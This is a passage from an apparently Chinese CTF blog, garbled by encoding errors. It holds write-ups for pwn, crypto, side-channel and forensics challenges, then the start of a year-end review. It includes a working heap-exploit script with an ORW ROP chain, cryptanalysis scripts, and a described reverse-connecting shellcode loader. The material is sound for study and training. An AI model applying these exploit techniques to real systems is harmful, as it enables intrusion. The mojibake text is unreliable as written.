libc_base+libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]#pause()add(0x50,b&#x27;a&#x27;)edit(5,0x500,b&#x27;a&#x27;*0x50+p64(0)+p64(0x31)+p64((IO_2_1_stdout-0x20) ^ ((heap_base - 0x2000) &gt;&gt; 12)))target_addr = libc_base+libc.symbols[&#x27;_environ&#x27;]#iofile leak stack addr_add(0x20,b&quot;a&quot;)add(0x20,b&quot;a&quot;)payload = p64(0)*3+p64(libc_base+0x217600)+p64(0xfbad1800)+p64(libc_base+0x21b803)*3+p64(target_addr)+p64(target_addr+8)edit(7,0x500,payload)stack_addr = u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))success(&quot;stack_addr = &quot;+hex(stack_addr))pause()delete(0)delete(4)payload = b&#x27;a&#x27;*0x200+p64(0)+p64(0x211)+p64((stack_addr - 0x178) ^ ((heap_base) &gt;&gt; 12))edit(3,0x500,payload)add(0x200,b&quot;a&quot;)pop_rdi_ret = libc_base + 0x000000000002a3e5pop_rsi_ret = libc_base + 0x000000000002be51pop_rdx_ret = libc_base + 0x0000000000170337pop_rax_ret = libc_base + 0x0000000000045eb0syscall_ret = libc_base + 0x0000000000091316flag_addr = stack_addr - 0x178#orwpayload = b&#x27;/flag\\x00&#x27;.ljust(8,b&#x27;\\x00&#x27;)+p64(pop_rdi_ret)+p64(flag_addr)+p64(pop_rsi_ret)+p64(0)+p64(pop_rax_ret)+p64(2)+p64(syscall_ret)payload += p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(stack_addr+0x300)+p64(pop_rdx_ret)+p64(0x50)+p64(pop_rax_ret)+b&#x27;a&#x27;*6+p64(0)+p64(syscall_ret)payload += p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(stack_addr+0x300)+p64(pop_rdx_ret)+p64(0x50)+p64(pop_rax_ret)+b&#x27;a&#x27;*6+p64(1)+p64(syscall_ret)add(0x200,payload)p.interactive()\n\nCryptoOvOé¢˜ç›®æè¿°from Crypto.Util.number import *from secret import flagnbits = 512p = getPrime(nbits)q = getPrime(nbits)n = p * qphi = (p-1) * (q-1)while True:    kk = getPrime(128)    rr = kk + 2    e = 65537 + kk * p + rr * ((p+1) * (q+1)) + 1    if gcd(e, phi) == 1:        breakm = bytes_to_long(flag)c = pow(m, e, n)e = e &gt;&gt; 200 &lt;&lt; 200print(f&#x27;n = &#123;n&#125;&#x27;)print(f&#x27;e = &#123;e&#125;&#x27;)print(f&#x27;c = &#123;c&#125;&#x27;)&quot;&quot;&quot;n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823&quot;&quot;&quot;\n\nè§£é¢˜æ€è·¯æœ‰ä¸¤ä¸ªéƒ¨åˆ†\ne = 65537 + kk * p + rr * ((p+1) * (q+1)) + 1if gcd(e, phi) == 1:      break\n\ne = e &gt;&gt; 200 &lt;&lt; 200\né¢˜ç›®é‡Œç»™å‡ºäº†ä¸€ä¸ªå¥‡æ€ªæ„é€ çš„eï¼Œeä¸phiæœ‰é€†å…ƒï¼Œä¸”eçš„å 200 bits è¢«æŠ¹å»ã€‚æ ¹æ®ç»™å‡ºçš„é¢˜ç›®æœ‰$$e &#x3D; 65538 + kkp + rr(p+1)(q+1)&#x3D;rrN + rr(p+q+1)+kkp + 65538$$å› ä¸º Nçš„ bits è¶³å¤Ÿå¤§ï¼Œé‚£ä¹ˆ $$\\frac{e}{N}$$ å°±èƒ½å¾—åˆ°å…³é”®çš„ $$rr$$ å’Œ $$kk$$ ï¼šrr &#x3D; \\frac{e}{N} \\ kk &#x3D; rr - 2$$ä»¤ $$e$$  ä¸¤è¾¹åŒæ—¶ä¹˜ $$p$$ ï¼š$$pE &#x3D; rrNp+rr(p^2+N+p)+kkp^2 + 65538p &#x3D; (rr +kk)p^2 + (rr+N +65538)p + rrN$$ç°åœ¨å°±æœ‰äº†ä¸€ä¸ªå…³äº $$p$$ çš„æ–¹ç¨‹ï¼Œè§£å‡ºæ–¹ç¨‹å°±èƒ½åˆ†è§£ $$p$$ï¼Œä½†æ˜¯é—®é¢˜åœ¨äºåªç»™å‡ºäº† $$e$$ çš„é«˜ä½ï¼Œè€Œä¸æ˜¯å®Œæ•´çš„ $$e$$ã€‚äºæ˜¯è€ƒè™‘åœ¨å®æ•°ä¸Šæ±‚å¤šé¡¹å¼çš„æ ¹ï¼Œç„¶åå†è½¬åˆ° $$Z_n$$ ä¸Šè¿›è¡Œ copperSmithã€‚\nPR.&lt;x&gt; = PolynomialRing(RealField(1000))f = (kk+rr)*x**2 + (rr*n+65538)*x + rr*n - e*xres = f.roots()if res:   print(res)   for i in res:      print(i[0])      print(int(i[0]))\n\nå®Œæ•´è„šæœ¬ï¼š\nn = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823rr = e // nkk = rr - 2PR.&lt;x&gt; = PolynomialRing(RealField(1000))f = (kk+rr)*x**2 + (rr*n+65538)*x + rr*n - e*xres = f.roots()if res:   print(res)   for i in res:      # print(i[0])      # print(int(i[0]))      P.&lt;y&gt; = PolynomialRing(Zmod(n))      h = int(i[0]) + y      rt = h.monic().small_roots(X=2^200,beta=0.4)      if rt:         print(rt)         for i in rt:            p = ZZ(gcd(ZZ(h(i)),n))            print(p)            e = 65537 + kk * p + rr * ((p+1) * (q+1)) + 1q = n // ZZ(p)d = pow(e,-1,(p-1)*(q-1))m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))\n\nhashé¢˜ç›®è¯´æ˜ğŸ’¡ é¢˜ç›®å†…å®¹ï¼šä½ èƒ½ä»…ä»…é€šè¿‡ä¸€ä¸ª Python2.7 è‡ªå¸¦çš„ hash å‡½æ•°çš„è¾“å‡ºï¼Œè®¡ç®—å‡ºå®ƒçš„åŸè±¡çš„ sha384 å“ˆå¸Œå€¼å—ï¼Ÿ\n#!/usr/bin/python2# Python 2.7 (64-bit version)from secret import flagimport os, binascii, hashlibkey = os.urandom(7)print hash(key)print int(hashlib.sha384(binascii.hexlify(key)).hexdigest(), 16) ^ int(binascii.hexlify(flag), 16)\n\n745731258330110123513903983817893117249931704406959869971132956255130487015289848690577655239262013033618370827749581909492660806312017\n\nè§£é¢˜æ€è·¯1.ä¿¡æ¯æ”¶é›†é¦–å…ˆæ˜¯ç”¨ edge çš„ copilot æœç´¢åˆ°äº† python2.7 çš„ hash() çš„å®ç°ï¼Œæ˜¯ FNV ç»“æ„ã€‚\nhttps://github.com/neuml/py27hash/blob/master/src/python/py27hash/hash.py\né‡ç‚¹å…³æ³¨ shash()\nåŒæ—¶è¿˜æœ‰ PEP 456 ä½œä¸ºå‚è€ƒ\nPEP 456 â€“ Secure and interchangeable hash algorithm | peps.python.org\nä¹Ÿæ˜¯åŒæ ·å…³æ³¨ FNV çš„å…·ä½“å®ç°ã€‚\n2.é¢˜ç›®æµç¨‹ç»™å‡ºçš„é¢˜ç›®é‡Œé¢ key æ˜¯éšæœºç»™å‡ºçš„ 7 ä½çš„åå…­è¿›åˆ¶ bytes å¯¹è±¡ï¼Œé€šè¿‡ hash() ç»™å‡ºäº†ä¸€ä¸ªå€¼ã€‚\næœ‰æ˜ å°„ $x &#x3D; h(m)$ ï¼Œå…¶ä¸­ $m$ å«åšåŸè±¡ï¼Œè¿™ä¸ªé¢˜ç›®ä¹Ÿå°±æ˜¯è€ƒçš„åŸåƒæ”»å‡»\nç„¶åå°†è¿™ä¸ªå€¼è¿›è¡Œ sha384 ç­¾å åè·Ÿ flag åšå¼‚æˆ–ã€‚\né’ˆå¯¹åŸåƒæ”»å‡»ï¼Œç¬¬ä¸€ååº”å°±æ˜¯çˆ†ç ´ã€‚ä½†æ˜¯ 7 ä½åå…­è¿›åˆ¶æ˜¾ç„¶è¿‡å¤§ï¼Œ$256^7$ æ˜¾ç„¶ä¸èƒ½åœ¨æ¯”èµ›æœŸé—´å®Œå…¨çˆ†ç ´ã€‚é‚£ä¹ˆå¾ˆè‡ªç„¶çš„æƒ³åˆ°ï¼Œæœ‰æ²¡æœ‰åŠæ³•å‡å°‘æœç´¢èŒƒå›´ã€‚äºæ˜¯æœ‰äº† MITM  çš„æ€è·¯ã€‚\nå‡å°‘ä¸€åŠå­—ç¬¦ï¼Œå¤§æ¦‚åœ¨ $256^3$ é‚£ä¹ˆå°±æ¯”è¾ƒå®¹æ˜“è§£å†³äº†ã€‚\n3.è§£é¢˜ä¸‹é¢æ ¹æ® python2.7 çš„ hash å®ç°ï¼Œç»™å‡º FNV è¿™ç§ç»“æ„çš„ç®€æ˜“ç‰ˆæœ¬\ndef shash(value):    length = len(value)    mask = 0xffffffffffffffff    x = (value[0] &lt;&lt; 7) &amp; mask    for c in value:        x = (1000003 * x) &amp; mask ^ c    x ^= length &amp; mask    return x\n\nå¯ä»¥çŸ¥é“ç¬¬ä¸€ä¸ªå­—ç¬¦è¢«å·¦ç§» 7 ä½ï¼Œè€Œåå†æœ‰\nx = (1000003 * x) &amp; mask ^ c\nx ^= length &amp; mask\né‚£ä¹ˆå°è¯•ä»£å…¥ MITM ï¼Œåªè¦å‰å››ä¸ªå­—ç¬¦è·Ÿåä¸‰ä¸ªå­—ç¬¦çš„é€†æ˜¯ç›¸åŒçš„ï¼Œé‚£å°±æ»¡è¶³ key çš„æ¡ä»¶ã€‚\n(x ^ c) &amp; mask = (1000003 * x)\nx = (x ^ c) * 16109806864799210091 &amp; mask\næ³¨æ„ï¼Œ16109806864799210091 æ˜¯ 1000003 åœ¨æ¨¡ $2^{64}$ ä¸‹çš„ä¹˜æ³•é€†å…ƒã€‚\nå¯ä»¥å‚è€ƒï¼š\njoostrijneveld.nl\n4.å®Œæ•´è„šæœ¬import itertoolsmask = 0xffffffffffffffffinvmask = pow(1000003, -1, mask + 1)&quot;&quot;&quot;def shash(value):    length = len(value)    mask = 0xffffffffffffffff    x = (value[0] &lt;&lt; 7) &amp; mask    for c in value:        x = (1000003 * x) &amp; mask ^ c    x ^= length &amp; mask    return x&quot;&quot;&quot;def M1(a, b, c, d):    x = (a &lt;&lt; 7) &amp; mask    x = (1000003 * x) &amp; mask ^ a    x = (1000003 * x) &amp; mask ^ b    x = (1000003 * x) &amp; mask ^ c    x = (1000003 * x) &amp; mask ^ d    return xdef M2(p, m, r, y):    y = (y ^ r) * invmask &amp; mask    y = (y ^ m) * invmask &amp; mask    y = (y ^ p) * invmask &amp; mask    return ydic = &#123;&#125;# x ^= length &amp; mask# 7457312583301101235 ^ length &amp; mask = 7457312583301101236for i, j, k in itertools.product(range(256), repeat=3):    m = M2(i, j, k, y=7457312583301101236)    dic[m] = (i,j,k)for a, b, c, d in itertools.product(range(256), repeat=4):    m = M1(a, b, c, d)    if m in dic:        r = dic[m]        print(b, c, d, r)        print(f&quot;&#123;a:02x&#125;&#123;b:02x&#125;&#123;c:02x&#125;&#123;d:02x&#125;&#123;r[0]:02x&#125;&#123;r[1]:02x&#125;&#123;r[2]:02x&#125;&quot;)        break\n\nimport hashlibfrom Crypto.Util.number import long_to_byteskey = b&#x27;5d8cf03f5a0852&#x27;c = 13903983817893117249931704406959869971132956255130487015289848690577655239262013033618370827749581909492660806312017cc = int(hashlib.sha384(key).hexdigest(),16)print(cc)print(c^cc)print(long_to_bytes(c^cc))# 13903983817893096257191331302105079327691975168019975768926243203604911704907460100191445196042111296283969284429612# 56006392793428027524350123064630944990050645714249173991561467554927772009567904795068631029075949437# b&#x27;flag&#123;bdb537aa-87ef-4e95-bea4-2f79259bdd07&#125;&#x27;\n\nå¤å…¸å¯†ç é¢˜ç›®è¯´æ˜Atbash +base64 + caeser\nè§£é¢˜æ€è·¯\nMiscç«é”…é“¾è§‚å…‰æ‰“å¡é¢˜ç›®è¯´æ˜è§£é¢˜æ€è·¯è¿æ¥é’±åŒ…ç”¨ metamask\nç­”å¯¹ä¸ƒä¸ªæ‹¿åˆ° flag\n\nPower Trajectory Diagramé¢˜ç›®è¯´æ˜è§£é¢˜æ€è·¯ä¾§ä¿¡é“æ”»å‡»\næ­£ç¡®è¾“å…¥å­—ç¬¦åœ¨æŸäº›æ—¶é—´ç‚¹ä¼šè§¦å‘æ˜æ˜¾çš„åŠŸè€—ä½è°·,è¿™ä¸ªä½è°·æ¯”å…¶ä»–æ™®é€šå­—ç¬¦æ›´ä½ã€‚é€šè¿‡æ‰¾åˆ°æ¯ä¸ªæ•°æ®å—ä¸­æœ€ä½çš„ä½è°·,å°±èƒ½è¿˜åŸå‡ºå¯¹åº”çš„å­—ç¬¦\n\nimport numpy as npimport matplotlib.pyplot as plt# åŠ è½½æ•°æ®data = np.load(&#x27;C:\\\\Users\\\\Nanian233\\\\Desktop\\\\attachment.npz&#x27;)inputs = data[&#x27;input&#x27;]traces = data[&#x27;trace&#x27;]# å®šä¹‰æ¯ç»„çš„å­—ç¬¦æ•°é‡group_size = 40# è®¡ç®—æ€»ç»„æ•°num_groups = len(inputs) // group_size# ç»˜åˆ¶æ¯ä¸€ç»„çš„åŠŸè€—æ›²çº¿for group in range(num_groups):    start_idx = group * group_size    end_idx = (group + 1) * group_size        # æå–å½“å‰ç»„çš„è¾“å…¥å­—ç¬¦å’ŒåŠŸè€—æ›²çº¿    group_inputs = inputs[start_idx:end_idx]    group_traces = traces[start_idx:end_idx]        # æ‰¾åˆ°å½“å‰ç»„ä¸­åŠŸè€—æœ€ä½çš„æ›²çº¿ç´¢å¼•    min_trace_idx = np.argmin([np.min(trace) for trace in group_traces])        # ç»˜åˆ¶å½“å‰ç»„çš„æ‰€æœ‰åŠŸè€—æ›²çº¿    plt.figure(figsize=(12, 4))    for i, trace in enumerate(group_traces):        plt.plot(trace, label=group_inputs[i], alpha=0.5)        # é«˜äº®æ˜¾ç¤ºåŠŸè€—æœ€ä½çš„æ›²çº¿    plt.plot(group_traces[min_trace_idx], label=group_inputs[min_trace_idx], linewidth=3, color=&#x27;red&#x27;)        plt.title(f&#x27;Power Traces of Group &#123;group+1&#125;&#x27;)    plt.xlabel(&#x27;Sample Points&#x27;)    plt.ylabel(&#x27;Power Consumption&#x27;)    plt.legend(loc=&#x27;upper right&#x27;)    plt.tight_layout()    plt.show()\n\nimport numpy as npdata = np.load(&#x27;C:\\\\Users\\\\Nanian233\\\\Desktop\\\\attachment.npz&#x27;)a= data[&#x27;input&#x27;]b = data[&#x27;trace&#x27;]result = &quot;&quot;# éå†æ•°æ®å—for i in range(12):Â  Â  # è·å–å½“å‰æ•°æ®å—çš„è¾“å…¥Â  Â  sub_input = a[40 * i: 40 * (i + 1)]Â  Â  Â  Â  # æ‰¾åˆ°å½“å‰æ•°æ®å—ä¸­æ¯è¡Œçš„æœ€å°å€¼ç´¢å¼•Â  Â  min1 = [np.argmin(b[i * 40 + j]) for j in range(40)]Â  Â  Â  Â  # æ‰¾åˆ°æœ€å°å€¼ç´¢å¼•ä¸­çš„æœ€å¤§å€¼ç´¢å¼•Â  Â  min2 = np.argmax(min1)Â  Â  Â  Â  # å°†æ‰¾åˆ°çš„å­—ç¬¦è¿½åŠ åˆ°ç»“æœå­—ç¬¦ä¸²Â  Â  result += sub_input[min2]# æ‰“å°ç»“æœå­—ç¬¦ä¸²print(result)\n\né€šé£æœºé¢˜ç›®è¯´æ˜å·¥æ§\nè§£é¢˜æ€è·¯è¥¿é—¨å­ 7micro&#x2F;win æ‰“å¼€ wmp æ–‡ä»¶\nå‘ç°æ–‡ä»¶ç¼ºå°‘æ–‡ä»¶å¤´ï¼Œè¡¥ä¸Šå³å¯æ‰“å¼€\n\nç¬¦å·è¡¨ä¸‹æ‰¾åˆ°ä¸€ä¸² base64\n\n\nflag{2467ce26-fff9-4008-8d55-17df83ecbfc2}\n4. ç¥ç§˜æ–‡ä»¶é¢˜ç›®è¯´æ˜è§£é¢˜æ€è·¯ç¬¬ä¸€éƒ¨åˆ†ï¼š\næ ‡é¢˜åé¢æœ‰å¯†æ–‡\nQFCfpPQ6ZymuM3gq\nä½œè€…å¤„æœ‰ keyï¼šlanjing\nç®¡ç†è€…å¤„æœ‰åŠ å¯†æ–¹å¼ï¼šBifid cipher\n\n\nç¬¬äºŒéƒ¨åˆ†ï¼š\næŠŠ pptm æ”¹ä¸º zip å¹¶è§£å‹\n&#x2F;ppt&#x2F;embeddings&#x2F; Microsoft_Word_Document.docx\nWord æ–‡æ¡£é‡Œæ”¹æ ¼å¼ä¸ºæ­£æ–‡\n\næšä¸¾å‡¯æ’’ä¸€ä¸ªä¸€ä¸ªè¯•\n\n\nç¬¬ä¸‰éƒ¨åˆ†ï¼š\n\nvba çš„æ–‡ä»¶ï¼Œç”¨ oletools åç¼–è¯‘\n\nRC4 è§£å¯†\n\nç¬¬å››éƒ¨åˆ†ï¼š\nç¬¬ä¸‰é¡µ ppt ä¸­ç›´æ¥è§£å¯†\n\n\nç¬¬äº”éƒ¨åˆ†ï¼š\nç¬¬äº”é¡µ ppt åº•éƒ¨æ‹¿åˆ° base64 å¥—å¨ƒå¯†æ–‡\n\n\nç¬¬å…­éƒ¨åˆ†ï¼š\nåŒä¸Šé¡µå…¨é€‰ä¹‹åéšæœºæ‹–ä¸€æ‹–æ‰¾åˆ°å¯†æ–‡\n\n\nç¬¬ä¸ƒéƒ¨åˆ†ï¼š\n&#x2F;ppt&#x2F;slides&#x2F;slide4.xml\næ‹¿åˆ°å¯†æ–‡å’ŒåŠ å¯†æ–¹å¼\n\n\nç¬¬å…«éƒ¨åˆ†ï¼š\n&#x2F;ppt&#x2F;slideLayouts&#x2F;slideLayout2.xml æ‹¿åˆ°æç¤º\n\nå»æ‰ B b 1 3 åè§£å¯†\n\nç¬¬ä¹éƒ¨åˆ†ï¼š\n\nppt5 ä¸­é—´å›¾é‡Œé¢è¿˜æœ‰ä¸€å¼ æ®‹ç¼ºå›¾ï¼Œåœ¨æºæ–‡ä»¶å¤„å¯ä»¥æ‹¿åˆ°å®Œæ•´çš„\nç¬¬åéƒ¨åˆ†ï¼š\n\n\nç›—ç‰ˆè½¯ä»¶é¢˜ç›®è¯´æ˜è§£é¢˜æ€è·¯å…ˆç›´æ¥ strings çœ‹çœ‹æœ‰å•¥ç©æ„\n\nå‘ç°è®¿é—®äº†å¾ˆå¤šç½‘é¡µï¼Œè®¯é£ï¼Œç«ç‹ï¼Œç™¾åº¦ç­‰\nçœ‹åˆ°ä¸€ä¸ªå« winhack.exe çš„ï¼Œå‡ºç°æ¬¡æ•°å¾ˆå¤šï¼Œæ€€ç–‘æ˜¯è¿™ä¸ª\nStrings -e | 3842.dmp |winhack  æ‰¾åˆ° winhack.com\nhackexe.exe è¿è¡Œåæ‰“å¼€.ss å¾—åˆ° output.png\n\nStegsolve å‡ºä¸€ä¸ª zip æ–‡ä»¶ï¼Œä½†æœ‰æ‚ç³…ï¼Œgpt ä¸ªè„šæœ¬åˆ ä¸€ä¸‹\ndef process_file(input_file, output_file):    try:        with open(input_file, &#x27;rb&#x27;) as f:            data = f.read()                # Extract every other byte        new_data = data[::2]        with open(output_file, &#x27;wb&#x27;) as f:            f.write(new_data)        print(f&quot;Processed file saved as &#123;output_file&#125;&quot;)    except FileNotFoundError:        print(f&quot;Error: The file &#123;input_file&#125; does not exist.&quot;)    except Exception as e:        print(f&quot;An error occurred: &#123;e&#125;&quot;)# Usageinput_file = &#x27;inputfile&#x27;  # replace with your input file name without suffixoutput_file = &#x27;outputfile&#x27;  # replace with your desired output file name without suffixprocess_file(input_file, output_file)\n\nè§£å‹åå¾—åˆ°.b æ–‡ä»¶ï¼Œæ‰“å¼€æ˜¯ base85\nè§£ç åè½¬ hex ä¸¢ gpt\nè¿™æ®µç»è¿‡hexç¼–ç çš„ä»£ç æ˜¯ä¸€æ®µWindowså¹³å°çš„x64 shellcodeã€‚è§£ç åçš„å†…å®¹å¤§è‡´å¦‚ä¸‹:é¦–å…ˆé€šè¿‡ä¸€ç³»åˆ—æŒ‡ä»¤å¯¹æ ˆè¿›è¡Œäº†å¯¹é½æ“ä½œ,å¹¶ä¿å­˜äº†ä¸€äº›å¯„å­˜å™¨çš„å€¼ã€‚ç„¶åè·å–äº†å½“å‰è¿›ç¨‹çš„PEB(Process Environment Block)åœ°å€,å¹¶ä»ä¸­è·å–äº†å½“å‰è¿›ç¨‹çš„åŸºå€ImageBaseAddressã€‚æ¥ç€é€šè¿‡è§£æPEå¤´,éå†å¯¼å…¥è¡¨,æ‰¾åˆ°äº†kernel32.dllçš„åŸºå€ã€‚ç„¶åæ ¹æ®å¯¼å…¥è¡¨ä¸­å‡½æ•°åç§°çš„å“ˆå¸Œå€¼,å®šä½åˆ°äº†GetProcAddresså‡½æ•°çš„åœ°å€ã€‚æœ‰äº†GetProcAddresså‡½æ•°å,å°±å¯ä»¥åŠ¨æ€è·å–å…¶ä»–Windows APIå‡½æ•°çš„åœ°å€äº†,æ¯”å¦‚LoadLibraryAã€VirtualAllocã€WSAStartupç­‰ã€‚æ¥ä¸‹æ¥è°ƒç”¨WSAStartupåˆå§‹åŒ–å¥—æ¥å­—,å†è°ƒç”¨WSASocketAåˆ›å»ºäº†ä¸€ä¸ªTCP Socketã€‚ç„¶åé€šè¿‡è°ƒç”¨connectå‡½æ•°,è¿æ¥åˆ°äº†ç‰¹å®šçš„IPåœ°å€å’Œç«¯å£(æ—keç¼–ç æ‰€ä»¥ipçœ‹ä¸å‡ºæ¥)ã€‚è¿æ¥æˆåŠŸå,å†æ¬¡è°ƒç”¨VirtualAllocåˆ†é…ä¸€å—å¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜,ç”¨äºåç»­æ¥æ”¶å’Œæ‰§è¡Œè¿œç¨‹ä»£ç ã€‚æœ€åä¸æ–­è°ƒç”¨recvä»socketæ¥æ”¶æ•°æ®åˆ°ä¸Šè¿°åˆ†é…çš„å†…å­˜ä¸­,å¹¶è°ƒç”¨CreateThreadåˆ›å»ºçº¿ç¨‹ä»å†…å­˜èµ·å§‹ä½ç½®å¼€å§‹æ‰§è¡Œã€‚\n\nå¯ä»¥è¯•ç€å†™ä¸€ä¸ª loader ç„¶ååœ¨æœ¬åœ°è¿è¡Œç”¨ winshark æŠ“åŒ…ï¼Œä½†æ˜¯ç›´æ¥ä¿å­˜åˆ° bin ç„¶åä¸¢å¾®æ­¥ä¹Ÿèƒ½è¯†åˆ«åˆ°ç‰¹å¾\n\n"},{"title":"CTF2023_by_str1k3","url":"/2024/01/01/CTF2023/","content":"æ¨èç”¨æ‰‹æœºé˜…è¯»ï¼Œå›¾ç‰‡å¤ªå¤§äº†\nlong live and pwnå»å¹´ä¸€ç›´æ²¡å•¥å¹´ç»ˆæ€»ç»“ï¼ŒæŠŠå¤§ä¸€ä¸Šé‚£åŠå¹´ä¹Ÿä¸€èµ·å†™ä¸‹ç”¨æ—¶é—´çº¿æ¥å™è¿°å§ï¼Œçºªå¿µä¸€ä¸‹å‚åŠ è¿‡çš„Timelinesecæ‹›æ–°(doge)(åé¢æˆ‘å¤ªå¿™äº†å¯„æ‰äº†)\nlibc_start_main9æœˆä»½å°±è¿™æ ·æ¥åˆ°äº†è¿™é‡Œï¼Œå—¯ï¼Œå°±è¿™æ ·ã€‚å†›è®­æœ€åå‡ å¤©å°±é‡ä¸Šäº†thatâ€™s when the story began\n#include &lt;CTF.h&gt;ç¬¬ä¸€åœºæ–°ç”Ÿèµ›æ˜¯è¥¿ç”µçš„ï¼Œèµ›é¢˜å¾ˆæ–°ç”Ÿå‹å¥½ï¼Œè²Œä¼¼moeCTF2023æ²¡æœ‰moeCTF2022æ–°ç”Ÿå‘äº†ï¼ˆï¼Ÿï¼‰ï¼Œæœ‰ç‚¹æ€€å¿µä¸€æ­¥ä¸€æ­¥æ­ç¯å¢ƒçš„æ—¥å­æ‡µæ‡µæ‡‚æ‡‚çš„ç¬¬ä¸€æ¬¡å›¢ä½“CTFï¼Œå•¥ä¹Ÿä¸ä¼šï¼Œå°±å¹²å‡ºæ¥ä¸€ç‚¹miscï¼Œä½†åšå¾—å¾ˆå¼€å¿ƒéå¸¸å¥½wpæ¥ä¸‹æ¥æ‰“äº†åœºUNCTFï¼Œå•äººèµ›ï¼Œåšå‡ºæ¥çš„åŸºæœ¬æ˜¯æ—¥çƒ‚çš„é¢˜ï¼Œä½†æ˜¯æœ‰400åˆ†ï¼Œåç‰¢ä½†å¼€å¿ƒçš„ä¸€åœºä¸­é—´å‚åŠ äº†å›¢é˜Ÿçš„é¢è¯•ï¼Œæ„Ÿè°¢@g0atå’Œ@aposimport miscåæœˆåˆè²Œä¼¼æ‰“äº†é•¿å®‰æ¯ï¼Œå•¥ä¹Ÿä¸ä¼šï¼Œæ‹¿åˆ°äº†ç«çœ¼ä½†æ˜¯æ ¹æœ¬ä¸ä¼šç”¨:)æœ€æš´æ®„å¤©ç‰©çš„ä¸€é›†\nremote Hor1zon debuggerå¤§æ¦‚è¿™ä¸ªæ—¶å€™æˆ˜é˜Ÿå®šä¸‹äº†åå­—ï¼Œæœ‰äº†è‡ªå·±çš„logoï¼Œé•¿å®‰æ¯çš„æ—¶å€™ç¬¬ä¸€æ¬¡é¢åŸºï¼Œè¿™ä¸ªæ—¶å€™è·Ÿæ´»è·ƒçš„å¸ˆå‚…ä»¬å·²ç»æŒºç†Ÿçš„äº†\nfrom pwn import ropå¼€å§‹å­¦ç‚¹pwnï¼Œè²Œä¼¼åœ¨11ã€12æœˆä»½åˆ°å¯’å‡éƒ½åœ¨è·ŸELFæ–‡ä»¶ã€Linuxä¹‹ç±»çš„æ‰“äº¤é“ï¼Œä¹‹å‰æ²¡å­¦è¿‡ï¼Œå¾ˆæ–°é²œï¼Œå­¦äº†ä¸å°‘å´åˆæ²¡é‚£ä¹ˆæ¸…æ™°  å¤©æƒä¿¡å®‰çš„catf1agè²Œä¼¼æ˜¯æˆ‘å’ŒHor1zonæ‰“çš„ç¬¬ä¸€åœºéæ–°ç”ŸCTFï¼Œçœ‹åˆ°ä¸€ä¸ªezarmå°±å¯„äº†ï¼Œè¿˜æ˜¯å•¥ä¹Ÿä¸ä¼šå¯’å‡å‚åŠ äº†ä¸€æ³¢hwsçš„åˆèµ›ï¼ˆå¯„ï¼‰å’Œå±±çŸ³çš„å†¬ä»¤è¥ï¼Œå­¦åˆ°å¾ˆå¤šï¼Œæ›´è¿›ä¸€æ­¥ä»¤äººé—æ†¾çš„æ˜¯å½“æ—¶ä¸€èµ·å‚åŠ Hor1zonæ‹›æ–°çš„å·²ç»å‰©ä¸‹ä¸å¤šäº†ã€‚æƒ…äººèŠ‚å½“å¤©æ”¶åˆ°äº†å¾ˆæ£’çš„æŠ½å¥–å¥–å“ï¼Œå¾ˆå¸…å¾ˆçˆ±\npackage GDOUCTFæœ‰å¹¸ä½œä¸ºéƒ¨åˆ†å‡ºé¢˜äººå‚ä¸äº†GDOUCTF2023çš„å‡ºé¢˜ï¼ˆå…¶å®åªæœ‰å¥‡æ€ªçš„ELFæ˜¯æˆ‘å†™çš„ï¼‰ï¼Œä¸»è¦æ˜¯å› ä¸ºdockerä¸€å¼€å§‹ç©ä¸æ˜ç™½ï¼Œé¢˜çš„æ€è·¯ä¹ŸæŒºçƒ‚çš„ã€‚å€’æ˜¯mç¥ä¸»æŒçš„random pwnè®©å¸ˆå‚…ä»¬å¥½å¥½å¹²äº†ä¸€æ³¢éšæœºæ•°hhhè¿™é‡Œè¦åæ§½ä¸€ä¸‹æ ¡å›­ç½‘ï¼Œæ”¯æŒå°±æ”¯æŒï¼Œæ€ä¹ˆç»™çš„æœåŠ¡å™¨è¿™ä¹ˆæ‹‰ï¼Œå°èŒƒå›´æµ‹è¯•å°±å¯„äº†ï¼Œèµ›åå¥–é‡‘ä¹Ÿæ¶ˆå¤±äº†:(ã€‚è¿™é‡Œè¦@g0atï¼Œä½ åšçš„å¥½å•Šï¼Œé¦™å•Šï¼Œå¾ˆé¦™å•Šï¼ŒæŒ‡æ‰¾åˆ°é•¿äº­ã€hackingclubã€NSSCTFä¸‰æ–¹å¼ºåŠ›æ´åŠ©ã€‚æ€»ä¹‹æ˜¯åŠæˆåŠŸäº†ï¼Œè€Œä¸”åœ¨æ ¡å†…å†æ‰¾åˆ°ä¸€äº›å¿—åŒé“åˆçš„æ–°äººã€‚\ndef 